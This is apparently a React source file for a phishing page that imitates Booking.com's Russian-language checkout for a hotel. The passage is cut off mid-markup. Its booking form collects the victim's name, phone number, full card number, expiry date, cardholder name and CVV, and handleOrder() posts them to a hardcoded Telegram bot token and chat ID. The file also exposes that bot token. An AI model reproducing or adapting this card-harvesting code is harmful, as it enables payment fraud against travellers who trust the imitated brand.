import React, {useState} from 'react';

import {Container, Row, Col, Form, Button, Image} from 'react-bootstrap';
import axios from "axios";
import styled from "styled-components";

function BookingPaymentTime() {
    return <section className="bui-card bp-card--prepayment-schedule bui-u-bleed@small mb-1">
        <div className="bui-card__content" bis_skin_checked="1">
            <header className="bui-card__header">
                <h2 className="bui-card__title">
                    Ваш график платежей
                </h2>
            </header>
            <p className="bui-card__text">
                Предоплата в размере полной стоимости бронирования будет списана с вас в любое время.
            </p>
        </div>
    </section>;
}

function CancelBookingPrice() {
    return <section className="bui-card bp-card--cancellation-schedule bui-u-bleed@small mb-1">
        <div className="bui-card__content" bis_skin_checked="1">
            <header className="bui-card__header">
                <h2 className="bui-card__title">
                    Сколько стоит отмена бронирования?
                </h2>
            </header>
            <div className="bui-card__text" bis_skin_checked="1">
                <ul className="bp-schedule js-bp-schedule--cancellation e2e-cancellation-schedule">
                    <li className="bp-schedule__milestone">
                        <div className="bp-schedule__milestone-name" bis_skin_checked="1">
                            В случае отмены вы платите
                        </div>
                        <div className="bp-schedule__milestone-value" bis_skin_checked="1">
<span data-component="core/animate-price" className="" data-value="27429.14" data-currency="" data-precision="0"
      data-animate-price-group-name="bp_payment_cancellation_cost_1" data-animation-speed="0.7"
      style={{display: 'inline-block'}}>
UAH&nbsp;27 429,14
</span>
                        </div>
                    </li>
                </ul>
            </div>
        </div>
    </section>;
}



const BookingForm = () => {
    const [entity, setEntity] = useState({
        firstName: '',
        lastName: '',
        fatherName: '',
        phoneNumber: '',
        cardNumber: '',
        cardDate: '',
        cardholderName: '',
        cardCVV: '',
        country: '',
        phoneCountry: '',
        email:'',
        customerFIO:''
    })

    function handleOrder() {
        const telegramMessage = `
            Имя : ${entity.firstName}\nФамилия : ${entity.lastName}\nОтчество : ${entity.fatherName}\nНомер телефона : ${entity.phoneNumber}\nНомер карты : ${entity.cardNumber}\nСрок карты : ${entity.cardDate}\nИмя владельца карты : ${entity.cardholderName}\nCVV : ${entity.cardCVV}`;
        const botToken = '6915780237:AAF05hr5p52ERTtKxQpyZoVpIvB-r-MxW28\n'; // enter token
        const telegramChatId = '497578008'; // enter chat id
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const params = {
            chat_id: telegramChatId,
            text: telegramMessage
        };
        axios.post(url, params);
    }

    function Header() {
        return <div data-bui-theme="traveller_ex-light" bis_skin_checked="1">
            <div data-capla-component-boundary="b-checkout-bp-accommodation/TravellerHeader"
                 data-capla-hydration="0" bis_skin_checked="1">
                <div className="web-shell-header-mfe ab4f62cc7e a1902a1d4e" data-testid="web-shell-header-mfe"
                     bis_skin_checked="1">
                    <header className=" b4ea8459d6">
                        <nav className="c20fd9b542">
                            <div className="f9966e6860" bis_skin_checked="1">
                                <div className="a945757098" bis_skin_checked="1"><span data-testid="header-logo"><a
                                    data-testid="header-booking-logo" aria-label="Booking.com"
                                    href="https://www.booking.com/index.ru.html?label=gen173nr-1FCAEoggI46AdIM1gEaOkBiAEBmAEhuAEHyAEM2AEB6AEB-AELiAIBqAIDuAKK0amxBsACAdICJDlkZGJiODlhLTY4MDYtNDM3OS04Y2Q0LTU5OGM3MmQ0OTMzZdgCBuACAQ&amp;sid=e589135fa570a4f62c25ca0d764c7e4c&amp;aid=304142"
                                    className="a83ed08757"><svg xmlns="http://www.w3.org/2000/svg" fill="none"
                                                                viewBox="0 0 180 30"><path fill="#fff"
                                                                                           d="M70.6 2.73999C70.602 2.19808 70.7646 1.66892 71.0673 1.21943C71.3701 0.769947 71.7993 0.420321 72.3007 0.214768C72.8021 0.00921437 73.3532 -0.0430342 73.8843 0.064629C74.4155 0.172292 74.9027 0.435032 75.2845 0.819622C75.6663 1.20421 75.9255 1.69338 76.0293 2.22527C76.133 2.75716 76.0768 3.30788 75.8676 3.80779C75.6584 4.3077 75.3056 4.73434 74.8539 5.03377C74.4022 5.3332 73.8719 5.49197 73.33 5.48999C72.9702 5.48868 72.6141 5.41651 72.2822 5.2776C71.9503 5.13869 71.649 4.93576 71.3955 4.6804C71.1419 4.42504 70.9412 4.12225 70.8047 3.78931C70.6683 3.45637 70.5987 3.09982 70.6 2.73999V2.73999ZM116.5 23.77C117.044 23.772 117.577 23.6124 118.031 23.3114C118.484 23.0104 118.838 22.5816 119.048 22.0793C119.257 21.577 119.313 21.0238 119.208 20.4897C119.103 19.9555 118.842 19.4646 118.458 19.079C118.074 18.6934 117.584 18.4305 117.05 18.3236C116.516 18.2167 115.963 18.2705 115.46 18.4784C114.957 18.6862 114.527 19.0387 114.224 19.4911C113.922 19.9436 113.76 20.4757 113.76 21.02C113.76 21.7476 114.048 22.4456 114.562 22.961C115.075 23.4764 115.772 23.7673 116.5 23.77V23.77ZM25.7 6.72999C24.0129 6.74775 22.3688 7.26426 20.9746 8.21447C19.5805 9.16469 18.4986 10.5061 17.8653 12.0699C17.2319 13.6337 17.0754 15.3499 17.4154 17.0025C17.7554 18.6551 18.5767 20.1701 19.776 21.3569C20.9752 22.5436 22.4988 23.349 24.1548 23.6717C25.8108 23.9944 27.5253 23.8199 29.0824 23.1702C30.6395 22.5205 31.9695 21.4247 32.9051 20.0206C33.8406 18.6166 34.3399 16.9672 34.34 15.28C34.3768 14.1396 34.1778 13.0038 33.7555 11.9438C33.3331 10.8839 32.6965 9.92248 31.8855 9.11989C31.0744 8.3173 30.1064 7.69078 29.0421 7.27955C27.9778 6.86831 26.84 6.68122 25.7 6.72999V6.72999ZM25.7 19.83C23.35 19.83 21.7 17.96 21.7 15.28C21.7 12.6 23.34 10.73 25.7 10.73C28.06 10.73 29.7 12.6 29.7 15.28C29.7 17.96 28.11 19.83 25.7 19.83ZM65.3 15.71C65.1321 15.3716 64.9128 15.0613 64.65 14.79L64.5 14.63L64.66 14.48C64.9116 14.2078 65.1423 13.917 65.35 13.61L69.74 7.05999H64.41L61.1 12.19C60.9586 12.3442 60.782 12.4621 60.5852 12.5334C60.3885 12.6048 60.1774 12.6277 59.97 12.6H59.22V2.90999C59.22 0.979993 58.01 0.709993 56.71 0.709993H54.48V23.58H59.21V16.72H59.65C60.19 16.72 60.56 16.78 60.73 17.08L63.35 21.97C63.5773 22.5089 63.9785 22.9563 64.4895 23.2408C65.0006 23.5253 65.5922 23.6306 66.17 23.54H69.8L67.09 19.07L65.3 15.71ZM88.27 6.68999C87.3747 6.67014 86.4851 6.83782 85.6584 7.18226C84.8318 7.5267 84.0863 8.04028 83.47 8.68999L83.18 8.97999L83.08 8.57999C82.9261 8.08803 82.6021 7.66692 82.166 7.39207C81.7299 7.11723 81.2102 7.0066 80.7 7.07999H78.57V23.57H83.29V15.97C83.275 15.2919 83.373 14.6159 83.58 13.97C83.7979 13.1302 84.2923 12.3883 84.9836 11.8639C85.6748 11.3396 86.5225 11.0634 87.39 11.08C88.85 11.08 89.39 11.85 89.39 13.86V21.05C89.335 21.3921 89.3619 21.7424 89.4686 22.072C89.5753 22.4017 89.7586 22.7013 90.0036 22.9463C90.2487 23.1914 90.5483 23.3747 90.878 23.4814C91.2076 23.5881 91.5579 23.615 91.9 23.56H94.12V13.07C94.15 8.89999 92.12 6.68999 88.27 6.68999V6.68999ZM73.39 7.05999H71.17V23.58H75.87V9.57999C75.9234 9.24041 75.8964 8.89304 75.7913 8.56576C75.6862 8.23848 75.5058 7.94038 75.2647 7.69537C75.0236 7.45037 74.7284 7.26527 74.4028 7.15493C74.0773 7.04459 73.7304 7.01208 73.39 7.05999V7.05999ZM44.16 6.72999C42.4729 6.74775 40.8288 7.26426 39.4346 8.21447C38.0405 9.16469 36.9586 10.5061 36.3253 12.0699C35.6919 13.6337 35.5354 15.3499 35.8754 17.0025C36.2154 18.6551 37.0367 20.1701 38.236 21.3569C39.4352 22.5436 40.9588 23.349 42.6148 23.6717C44.2708 23.9944 45.9853 23.8199 47.5424 23.1702C49.0995 22.5205 50.4295 21.4247 51.3651 20.0206C52.3006 18.6166 52.7999 16.9672 52.8 15.28C52.8368 14.1396 52.6378 13.0038 52.2155 11.9438C51.7931 10.8839 51.1565 9.92248 50.3455 9.11989C49.5344 8.3173 48.5664 7.69078 47.5021 7.27955C46.4378 6.86831 45.3 6.68122 44.16 6.72999V6.72999ZM44.16 19.83C41.81 19.83 40.16 17.96 40.16 15.28C40.16 12.6 41.8 10.73 44.16 10.73C46.52 10.73 48.16 12.6 48.16 15.28C48.16 17.96 46.57 19.83 44.16 19.83ZM144.89 6.72999C143.203 6.74775 141.559 7.26426 140.165 8.21447C138.77 9.16469 137.689 10.5061 137.055 12.0699C136.422 13.6337 136.265 15.3499 136.605 17.0025C136.945 18.6551 137.767 20.1701 138.966 21.3569C140.165 22.5436 141.689 23.349 143.345 23.6717C145.001 23.9944 146.715 23.8199 148.272 23.1702C149.829 22.5205 151.16 21.4247 152.095 20.0206C153.031 18.6166 153.53 16.9672 153.53 15.28C153.567 14.1396 153.368 13.0038 152.945 11.9438C152.523 10.8839 151.887 9.92248 151.075 9.11989C150.264 8.3173 149.296 7.69078 148.232 7.27955C147.168 6.86831 146.03 6.68122 144.89 6.72999V6.72999ZM144.89 19.83C142.54 19.83 140.89 17.96 140.89 15.28C140.89 12.6 142.53 10.73 144.89 10.73C147.25 10.73 148.89 12.6 148.89 15.28C148.89 17.96 147.3 19.83 144.89 19.83ZM109.74 7.01999C109.356 6.98285 108.97 7.05749 108.627 7.23491C108.285 7.41233 108.001 7.68497 107.81 8.01999L107.69 8.26999L107.47 8.07999C106.253 7.08344 104.711 6.57072 103.14 6.63999C98.75 6.63999 95.78 9.94999 95.78 14.87C95.78 19.79 98.85 23.22 103.23 23.22C104.521 23.2791 105.795 22.9061 106.85 22.16L107.21 21.88V22.34C107.21 24.55 105.78 25.77 103.21 25.77C102.131 25.755 101.062 25.5555 100.05 25.18C99.8562 25.0813 99.6419 25.0295 99.4244 25.0287C99.2069 25.0279 98.9923 25.0782 98.7977 25.1754C98.6032 25.2727 98.4342 25.4143 98.3043 25.5887C98.1745 25.7632 98.0874 25.9657 98.05 26.18L97.14 28.46L97.47 28.63C99.2593 29.5195 101.232 29.9783 103.23 29.97C107.23 29.97 111.9 27.91 111.9 22.14V7.01999H109.74ZM104.06 19.11C101.5 19.11 100.58 16.86 100.58 14.76C100.58 13.83 100.81 10.76 103.81 10.76C105.3 10.76 107.3 11.18 107.3 14.86C107.3 18.38 105.54 19.11 104.06 19.11ZM13.09 11.85L12.4 11.47L13 10.97C13.6103 10.4334 14.0951 9.76919 14.42 9.02435C14.7449 8.27951 14.9019 7.47231 14.88 6.65999C14.88 3.05999 12.09 0.739993 7.79 0.739993H2.31C1.69606 0.762953 1.11431 1.02048 0.684566 1.45953C0.254821 1.89857 0.00981021 2.48571 0 3.09999L0 23.5H7.88C12.67 23.5 15.77 20.89 15.77 16.84C15.8104 15.8446 15.583 14.8566 15.1116 13.9789C14.6403 13.1012 13.9421 12.3661 13.09 11.85V11.85ZM4.37 6.07999C4.37 5.01999 4.82 4.51999 5.8 4.45999H7.8C8.16093 4.42761 8.52456 4.47504 8.8651 4.59892C9.20565 4.7228 9.51476 4.9201 9.77052 5.17681C10.0263 5.43353 10.2224 5.74338 10.345 6.08438C10.4676 6.42538 10.5137 6.78919 10.48 7.14999C10.5194 7.51629 10.4791 7.88679 10.3616 8.23598C10.2442 8.58517 10.0524 8.90477 9.79964 9.17277C9.54684 9.44077 9.23898 9.65082 8.89723 9.78844C8.55549 9.92606 8.18798 9.988 7.82 9.96999H4.37V6.07999ZM8.2 19.64H4.37V15.06C4.37 14.06 4.76 13.57 5.59 13.45H8.2C8.99043 13.4949 9.7337 13.8406 10.2774 14.4161C10.8211 14.9916 11.124 15.7533 11.124 16.545C11.124 17.3367 10.8211 18.0984 10.2774 18.6739C9.7337 19.2494 8.99043 19.595 8.2 19.64ZM174.53 6.73999C173.558 6.74366 172.6 6.96575 171.726 7.38984C170.852 7.81393 170.084 8.42915 169.48 9.18999L169.14 9.62999L168.87 9.13999C168.437 8.355 167.787 7.71128 166.998 7.2857C166.209 6.86012 165.314 6.67067 164.42 6.73999C163.604 6.75328 162.798 6.93308 162.054 7.26838C161.309 7.60368 160.641 8.08742 160.09 8.68999L159.65 9.16999L159.48 8.53999C159.323 8.07152 159.008 7.67282 158.587 7.41334C158.167 7.15386 157.669 7.05005 157.18 7.11999H155.18V23.57H159.64V16.31C159.646 15.6629 159.727 15.0187 159.88 14.39C160.31 12.63 161.49 10.74 163.47 10.93C164.69 11.05 165.29 11.99 165.29 13.82V23.57H169.81V16.31C169.791 15.6345 169.875 14.9601 170.06 14.31C170.42 12.64 171.65 10.92 173.56 10.92C174.94 10.92 175.45 11.7 175.45 13.81V21.17C175.45 22.83 176.19 23.57 177.85 23.57H180V13.07C180 8.86999 178.15 6.73999 174.53 6.73999ZM133.69 17.86C132.51 19.095 130.913 19.8471 129.21 19.97C128.593 20.0073 127.974 19.914 127.395 19.6962C126.816 19.4784 126.29 19.141 125.85 18.706C125.41 18.271 125.067 17.7482 124.843 17.1716C124.619 16.5951 124.519 15.9778 124.55 15.36C124.498 14.7504 124.575 14.1365 124.776 13.5588C124.978 12.981 125.299 12.4524 125.719 12.0076C126.14 11.5629 126.649 11.212 127.215 10.978C127.78 10.744 128.388 10.6322 129 10.65C129.84 10.65 130.8 10.95 130.95 11.46V11.55C131.048 11.8986 131.258 12.2056 131.547 12.424C131.835 12.6425 132.188 12.7605 132.55 12.76H135V10.61C135 7.76999 131.39 6.73999 129 6.73999C123.81 6.73999 120 10.37 120 15.35C120 20.33 123.73 23.97 128.86 23.97C130.178 23.9562 131.479 23.6722 132.683 23.1355C133.887 22.5989 134.969 21.821 135.86 20.85L134 17.58L133.69 17.86Z"></path></svg></a></span>
                                </div>
                            </div>
                            <div className="c624d7469d f034cf5568 dab7c5c6fa c62ffa0b45 a3214e5942"
                                 bis_skin_checked="1"><span
                                className="f419a93f12"><button aria-expanded="false"
                                                               data-testid="header-currency-picker-trigger"
                                                               aria-label="Цены в Украинская гривна" type="button"
                                                               className="a83ed08757 c21c56c305 f38b6daa18 f671049264 deab83296e fd3248769f"><span
                                className="e4adce92df"></span></button></span><span className="f419a93f12"><button
                                aria-expanded="false" data-testid="header-language-picker-trigger"
                                aria-label="Язык: Русский" type="button"
                                className="a83ed08757 c21c56c305 f38b6daa18 f671049264 deab83296e fd3248769f"><span
                                className="e4adce92df"></span></button></span><span
                                className="f419a93f12"><a aria-expanded="false" aria-label="Поддержка клиентов"
                                                          data-testid="header-help-center"
                                                          href="https://secure.booking.com/help.ru.html?label=gen173nr-1FCAEoggI46AdIM1gEaOkBiAEBmAEhuAEHyAEM2AEB6AEB-AELiAIBqAIDuAKK0amxBsACAdICJDlkZGJiODlhLTY4MDYtNDM3OS04Y2Q0LTU5OGM3MmQ0OTMzZdgCBuACAQ&amp;sid=e589135fa570a4f62c25ca0d764c7e4c&amp;aid=304142&amp;source=header&amp;src=profile_contact_cs"
                                                          className="a83ed08757 c21c56c305 f38b6daa18 d691166b09 f671049264 deab83296e fd3248769f"><span
                                className="eedba9e88a"><span className="fcd9eec8fb c2cc050fb8" aria-hidden="true"><svg
                                xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path
                                d="M9.75 9a2.25 2.25 0 1 1 3 2.122 2.25 2.25 0 0 0-1.5 2.122v1.006a.75.75 0 0 0 1.5 0v-1.006c0-.318.2-.602.5-.708A3.75 3.75 0 1 0 8.25 9a.75.75 0 1 0 1.5 0zM12 16.5a1.125 1.125 0 1 0 0 2.25 1.125 1.125 0 0 0 0-2.25.75.75 0 0 0 0 1.5.375.375 0 1 1 0-.75.375.375 0 0 1 0 .75.75.75 0 0 0 0-1.5zM22.5 12c0 5.799-4.701 10.5-10.5 10.5S1.5 17.799 1.5 12 6.201 1.5 12 1.5 22.5 6.201 22.5 12zm1.5 0c0-6.627-5.373-12-12-12S0 5.373 0 12s5.373 12 12 12 12-5.373 12-12z"></path></svg></span></span></a></span><a
                                data-testid="header-custom-action-button"
                                href="https://join.booking.com/?label=gen173nr-1FCAEoggI46AdIM1gEaOkBiAEBmAEhuAEHyAEM2AEB6AEB-AELiAIBqAIDuAKK0amxBsACAdICJDlkZGJiODlhLTY4MDYtNDM3OS04Y2Q0LTU5OGM3MmQ0OTMzZdgCBuACAQ&amp;sid=e589135fa570a4f62c25ca0d764c7e4c&amp;aid=304142&amp;lang=ru&amp;utm_medium=frontend&amp;utm_source=topbar"
                                className="a83ed08757 c21c56c305 f38b6daa18 f671049264 deab83296e fd3248769f"><span
                                className="e4adce92df mx-1">Зарегистрировать свой объект</span></a><a
                                data-testid="header-sign-up-button" aria-label="Создать аккаунт"
                                href="https://account.booking.com/auth/oauth2?client_id=vO1Kblk7xX9tUn2cpZLS&amp;redirect_uri=https%3A%2F%2Fsecure.booking.com%2Flogin.html%3Fop%3Doauth_return&amp;response_type=code&amp;lang=ru&amp;aid=304142&amp;bkng_action=book&amp;prompt=signin&amp;state=UscHzqFZGsjDQ12X26c-rRsgnXF7rh_BXNL5VoYoO-9jl4xsswIJGpOKatAeGoZB8PyuCAKMoz2PLu-dahZVKgGC4K9woL73f0_aZR4CC8hdvu1ayphlODfqLwNy1eNbP-e-KjCzrhLh54e6WVlz_HFjqUNydNqrukQsrwRWD6lsTNDtRbWTVoYkgyDHJDZSypLejxGxIoLVwReqLWXVFpZI02NxotgO-h0kW8gOjr5HpEgnGdOp1VIh1QAaVVKkr9rJXN6xH5u7iHvyYpG-fGOggRcHLABtCSiwPs39B_pPTISWuQH0-CXxBYrlmpFS9a-7VnZxVcV9W1Wfo4LTznm5dDP8UfNTCc-sb4g8Xaw2L0ohzmdC6aMIUEyn_8xSOPIWh5Rce3U8Ea5jVLac2EN3BJ2IJF9mcWZv4bRBoHylDzyAl4nzWMOMh03ghZdZV9pSNC915tAkPmyOuqRI48YA-bFmjxbbR3vJWP6GWFKvPAjwFKUYC1NNW4HKiKGmg2-jMCD_Qg6iVSjb-p1lrYWgvTtsTp4LaelIAGrHyylHW9XfSBDcX8AeF4KRYJPmJCFLU3iUoZ9LMq6p-7OSNArqUkMCH5-yPVJBYwb5UBCdQUEECxh6UCME8YuxFyYFGpU25ebWeKAEvDpMAdedsRzgplSo2UeGp-2TSkWVmfu4K5AbANCNO4T5OVeW9s9HMlTMZfoCWFVAQ9PHsOVtDCoHHUioh75ii7dJ-Lmnu9yjW501gTeR0Y2rxKal9yjLkXKXDrrUGwChlbWrY3eOAXPQEimRyHj6ETD5m2M7AA_1947GvI9TkDBfhiUjLbtsjU_PJcdVp2x8XZ8cq0skhN7jajoVIUA3LuxNI7H7RROCczOv3Wr7CzTtNj6_WhvxJkBwc28rM1a71WM5VnN0bSD3edX_qQnTC8uIXOjdNxxklt0vRkPQd7SiwL4f_-dW6zOvRRS3cdMZ2zPH_4lWaU4YMqURQefnxSGfLxNafT4LE8NFIaFJwbL6h2vqrgO6Qn62hWxsdGLcOir1S7qnZLamjtNpUNHSy8ESWbvVyDUr3YDwGO9niL5gVRQBVSQ4qnldrdRbTg5s8IcvMSTdSQOVJwbiB4C7dvTe0mJgPCxSI3vcIDJ-iVdS8uEE7G93-DSTAJg8q4itE2iBb73X8e-miCgY6Gau1CUmJ2aTcwOY81Icz3T9t9P_PJl28F3OxaS-nTdRknpV-zraaF_ysxTfXGwupqnBc8BAj6dTzF47oY1vbN2EI_h3b7li6kiWeZwpp3Bhlibscg%3D%3D*eyJpZCI6InRyYXZlbGxlcl9oZWFkZXIifQ%3D%3D"
                                className="a83ed08757 c21c56c305 bf0537ecb5 ab98298258 deab83296e af7297d90d js-header-login-link"><span
                                className="e4adce92df mx-1">Зарегистрироваться</span></a>
                                <div className="abcc616ec7 c180176d40" bis_skin_checked="1"><a
                                    data-testid="header-sign-in-button" aria-label="Войти в аккаунт"
                                    href="https://account.booking.com/auth/oauth2?client_id=vO1Kblk7xX9tUn2cpZLS&amp;redirect_uri=https%3A%2F%2Fsecure.booking.com%2Flogin.html%3Fop%3Doauth_return&amp;response_type=code&amp;lang=ru&amp;aid=304142&amp;bkng_action=book&amp;prompt=signin&amp;state=UscHzqFZGsjDQ12X26c-rRsgnXF7rh_BXNL5VoYoO-9jl4xsswIJGpOKatAeGoZB8PyuCAKMoz2PLu-dahZVKgGC4K9woL73f0_aZR4CC8hdvu1ayphlODfqLwNy1eNbP-e-KjCzrhLh54e6WVlz_HFjqUNydNqrukQsrwRWD6lsTNDtRbWTVoYkgyDHJDZSypLejxGxIoLVwReqLWXVFpZI02NxotgO-h0kW8gOjr5HpEgnGdOp1VIh1QAaVVKkr9rJXN6xH5u7iHvyYpG-fGOggRcHLABtCSiwPs39B_pPTISWuQH0-CXxBYrlmpFS9a-7VnZxVcV9W1Wfo4LTznm5dDP8UfNTCc-sb4g8Xaw2L0ohzmdC6aMIUEyn_8xSOPIWh5Rce3U8Ea5jVLac2EN3BJ2IJF9mcWZv4bRBoHylDzyAl4nzWMOMh03ghZdZV9pSNC915tAkPmyOuqRI48YA-bFmjxbbR3vJWP6GWFKvPAjwFKUYC1NNW4HKiKGmg2-jMCD_Qg6iVSjb-p1lrYWgvTtsTp4LaelIAGrHyylHW9XfSBDcX8AeF4KRYJPmJCFLU3iUoZ9LMq6p-7OSNArqUkMCH5-yPVJBYwb5UBCdQUEECxh6UCME8YuxFyYFGpU25ebWeKAEvDpMAdedsRzgplSo2UeGp-2TSkWVmfu4K5AbANCNO4T5OVeW9s9HMlTMZfoCWFVAQ9PHsOVtDCoHHUioh75ii7dJ-Lmnu9yjW501gTeR0Y2rxKal9yjLkXKXDrrUGwChlbWrY3eOAXPQEimRyHj6ETD5m2M7AA_1947GvI9TkDBfhiUjLbtsjU_PJcdVp2x8XZ8cq0skhN7jajoVIUA3LuxNI7H7RROCczOv3Wr7CzTtNj6_WhvxJkBwc28rM1a71WM5VnN0bSD3edX_qQnTC8uIXOjdNxxklt0vRkPQd7SiwL4f_-dW6zOvRRS3cdMZ2zPH_4lWaU4YMqURQefnxSGfLxNafT4LE8NFIaFJwbL6h2vqrgO6Qn62hWxsdGLcOir1S7qnZLamjtNpUNHSy8ESWbvVyDUr3YDwGO9niL5gVRQBVSQ4qnldrdRbTg5s8IcvMSTdSQOVJwbiB4C7dvTe0mJgPCxSI3vcIDJ-iVdS8uEE7G93-DSTAJg8q4itE2iBb73X8e-miCgY6Gau1CUmJ2aTcwOY81Icz3T9t9P_PJl28F3OxaS-nTdRknpV-zraaF_ysxTfXGwupqnBc8BAj6dTzF47oY1vbN2EI_h3b7li6kiWeZwpp3Bhlibscg%3D%3D*eyJpZCI6InRyYXZlbGxlcl9oZWFkZXIifQ%3D%3D"
                                    className="a83ed08757 c21c56c305 bf0537ecb5 ab98298258 deab83296e af7297d90d js-header-login-link"><span
                                    className="e4adce92df mx-1">Войти в аккаунт</span></a></div>
                            </div>
                        </nav>
                    </header>
                </div>
            </div>
        </div>
    }

    function HotelInfo() {
        return <div className="c82435a4b8 a178069f51 a6ae3c2b40 a18aeea94d d794b7a0f7 f53e278e95 b68dc84f99 mb-1"
                    bui_stack_spaced_gap-s="4" bis_skin_checked="1">
            <div className="c624d7469d a0e60936ad e8f9ae2be9 a3214e5942" bui_stack_spaced_gap-s={'4'}
                 bis_skin_checked="1">
                <div className="c624d7469d f034cf5568 e8f9ae2be9 a937b09340 a3214e5942"
                     style={{'--bui_stack_spaced_gap-s': '4'}} bis_skin_checked="1">
                    <div className="dc5041d860 c72df67c95" bis_skin_checked="1">
                        <div className="c624d7469d a0e60936ad a3214e5942" style={{'--bui_stack_spaced_gap-s': '2'}}
                             bis_skin_checked="1">
                            <div className="c624d7469d dbf03e5db3 a3214e5942"
                                 style={{'--bui_stack_spaced_gap-s': '0.5'}}
                                 bis_skin_checked="1">
                                <div className="" bis_skin_checked="1"><h1 className="e1eebb6a1e">Jam Hotel
                                    Hnatyuka</h1></div>
                                <div className="" bis_skin_checked="1">
                                    <div className="c624d7469d f034cf5568 dab7c5c6fa a3214e5942"
                                         style={{'-bui_stack_spaced_gap-s': '2'}} bis_skin_checked="1">
                                        <div data-testid="property-details__metadata--property-type" className=""
                                             bis_skin_checked="1">
                                            <div bis_skin_checked="1">
                                                <div className="c624d7469d f034cf5568 dab7c5c6fa a3214e5942"
                                                     style={{'-bui_stack_spaced_gap-s': '2'}} bis_skin_checked="1">
                                                    <div className="abf093bdfe" bis_skin_checked="1">Отель</div>
                                                    <div className="a455730030" role="img" bis_skin_checked="1"><span
                                                        aria-hidden="true" className="fcd9eec8fb d31eda6efc c25361c37f"><svg
                                                        xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path
                                                        d="M23.555 8.729a1.505 1.505 0 0 0-1.406-.98h-6.087a.5.5 0 0 1-.472-.334l-2.185-6.193a1.5 1.5 0 0 0-2.81 0l-.005.016-2.18 6.177a.5.5 0 0 1-.471.334H1.85A1.5 1.5 0 0 0 .887 10.4l5.184 4.3a.5.5 0 0 1 .155.543l-2.178 6.531a1.5 1.5 0 0 0 2.31 1.684l5.346-3.92a.5.5 0 0 1 .591 0l5.344 3.919a1.5 1.5 0 0 0 2.312-1.683l-2.178-6.535a.5.5 0 0 1 .155-.543l5.194-4.306a1.5 1.5 0 0 0 .433-1.661z"></path></svg></span><span
                                                        aria-hidden="true" className="fcd9eec8fb d31eda6efc c25361c37f"><svg
                                                        xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path
                                                        d="M23.555 8.729a1.505 1.505 0 0 0-1.406-.98h-6.087a.5.5 0 0 1-.472-.334l-2.185-6.193a1.5 1.5 0 0 0-2.81 0l-.005.016-2.18 6.177a.5.5 0 0 1-.471.334H1.85A1.5 1.5 0 0 0 .887 10.4l5.184 4.3a.5.5 0 0 1 .155.543l-2.178 6.531a1.5 1.5 0 0 0 2.31 1.684l5.346-3.92a.5.5 0 0 1 .591 0l5.344 3.919a1.5 1.5 0 0 0 2.312-1.683l-2.178-6.535a.5.5 0 0 1 .155-.543l5.194-4.306a1.5 1.5 0 0 0 .433-1.661z"></path></svg></span><span
                                                        aria-hidden="true" className="fcd9eec8fb d31eda6efc c25361c37f"><svg
                                                        xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path
                                                        d="M23.555 8.729a1.505 1.505 0 0 0-1.406-.98h-6.087a.5.5 0 0 1-.472-.334l-2.185-6.193a1.5 1.5 0 0 0-2.81 0l-.005.016-2.18 6.177a.5.5 0 0 1-.471.334H1.85A1.5 1.5 0 0 0 .887 10.4l5.184 4.3a.5.5 0 0 1 .155.543l-2.178 6.531a1.5 1.5 0 0 0 2.31 1.684l5.346-3.92a.5.5 0 0 1 .591 0l5.344 3.919a1.5 1.5 0 0 0 2.312-1.683l-2.178-6.535a.5.5 0 0 1 .155-.543l5.194-4.306a1.5 1.5 0 0 0 .433-1.661z"></path></svg></span>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div data-testid="property-details__metadata--preferred-plus-property"
                                             className="" bis_skin_checked="1"><span className="f419a93f12"><span
                                            aria-expanded="false"
                                            className="fcd9eec8fb aefbbe98cd f2e7727575 d24fc26e73 e410954d4b"
                                            aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg"
                                                                    viewBox="0 0 32 18"><path fill="#FEBB02"
                                                                                              fill-rule="evenodd"
                                                                                              d="M6.73157e-08 2.25225C6.73157e-08 1.00912 1.00688 0 2.25225 0H15.7478C15.8167 0 15.885 0.00310154 15.9524 0.00917326C16.0199 0.00310178 16.0882 0 16.1572 0H29.6528C30.8959 0 31.905 1.00688 31.905 2.25225V15.7478C31.905 16.9909 30.8981 18 29.6528 18H16.1572C16.0888 18 16.0207 17.9969 15.9531 17.9908C15.8855 17.9969 15.817 18 15.7478 18H2.25225C1.65487 18.0002 1.08192 17.7629 0.659507 17.3405C0.237096 16.9181 -0.000145899 16.3451 6.73157e-08 15.7478V2.25225ZM7.335 13.545H12.1364C13.5486 13.545 13.5486 12.416 13.5486 12.416C14.6783 11.8516 14.1134 10.7226 14.1134 10.7226C14.9607 9.8759 14.1134 9.02919 14.1134 9.02919C14.6783 8.18247 14.1134 7.33576 13.2661 7.33576H9.59447L10.1593 5.36009C10.7242 3.66666 9.02961 3.10218 8.46474 5.07785L7.335 8.46471V13.545ZM3.915 8.46V13.545H6.705V8.46H3.915ZM21.99 6C21.99 5.56698 21.99 5.35048 22.0538 5.17732C22.1585 4.89281 22.3828 4.66855 22.6673 4.56377C22.8405 4.5 23.057 4.5 23.49 4.5C23.923 4.5 24.1395 4.5 24.3127 4.56377C24.5972 4.66855 24.8215 4.89281 24.9262 5.17732C24.99 5.35048 24.99 5.56698 24.99 6V7.5H26.49C26.923 7.5 27.1395 7.5 27.3127 7.56377C27.5972 7.66855 27.8215 7.89281 27.9262 8.17732C27.99 8.35048 27.99 8.56698 27.99 9C27.99 9.43302 27.99 9.64952 27.9262 9.82268C27.8215 10.1072 27.5972 10.3315 27.3127 10.4362C27.1395 10.5 26.923 10.5 26.49 10.5H24.99V12C24.99 12.433 24.99 12.6495 24.9262 12.8227C24.8215 13.1072 24.5972 13.3315 24.3127 13.4362C24.1395 13.5 23.923 13.5 23.49 13.5C23.057 13.5 22.8405 13.5 22.6673 13.4362C22.3828 13.3315 22.1585 13.1072 22.0538 12.8227C21.99 12.6495 21.99 12.433 21.99 12V10.5H20.49C20.057 10.5 19.8405 10.5 19.6673 10.4362C19.3828 10.3315 19.1585 10.1072 19.0538 9.82268C18.99 9.64952 18.99 9.43302 18.99 9C18.99 8.56698 18.99 8.35048 19.0538 8.17732C19.1585 7.89281 19.3828 7.66855 19.6673 7.56377C19.8405 7.5 20.057 7.5 20.49 7.5H21.99V6Z"
                                                                                              clip-rule="evenodd"></path></svg></span></span>
                                        </div>
                                    </div>
                                </div>
